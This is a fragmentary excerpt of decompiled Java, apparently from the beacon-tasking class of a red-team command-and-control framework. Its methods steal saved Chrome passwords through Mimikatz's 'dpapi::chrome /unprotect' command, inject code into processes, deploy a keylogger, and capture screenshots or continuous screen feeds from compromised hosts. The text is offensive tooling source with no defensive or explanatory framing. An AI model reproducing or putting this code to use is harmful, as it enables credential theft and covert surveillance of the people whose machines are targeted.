...
public class TaskBeacon {
   ...
   public void ChromeDump() {
      this.Mimikatz("dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect");
   }
   ...
   public void Inject(int var1, String var2, String var3) {
      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.Inject(this.bids[var4], var1, var2, var3);
      }
   ...
   public void KeyLogger() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         BeaconEntry var2 = DataUtils.getBeacon(this.data, this.bids[var1]);
         if (var2 != null) {
            this.getKeylogger().spawn(this.bids[var1], var2.arch());
         }
      }
   ...
   public void KeyLogger(int var1, String var2) {
      this.getKeylogger().inject(var1, var2);
   }
   ...
   public void Printscreen(int var1, String var2) {
      ScreenshotJob.Printscreen(this).inject(var1, var2);
   }
   ...
   public void Printscreen() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         BeaconEntry var2 = DataUtils.getBeacon(this.data, this.bids[var1]);
         if (var2 != null) {
            ScreenshotJob.Printscreen(this).spawn(this.bids[var1], var2.arch());
         }
      }
   ...
   public void Screenshot(int var1, String var2) {
      ScreenshotJob.Screenshot(this).inject(var1, var2);
   }
   ...
   public void Screenshot() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         BeaconEntry var2 = DataUtils.getBeacon(this.data, this.bids[var1]);
         if (var2 != null) {
            ScreenshotJob.Screenshot(this).spawn(this.bids[var1], var2.arch());
         }
      }
   ...
   public void Screenwatch(int var1, String var2) {
      ScreenshotJob.Screenwatch(this).inject(var1, var2);
   }
   ...
   public void Screenwatch() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         BeaconEntry var2 = DataUtils.getBeacon(this.data, this.bids[var1]);
         if (var2 != null) {
            ScreenshotJob.Screenwatch(this).spawn(this.bids[var1], var2.arch());
         }
      }
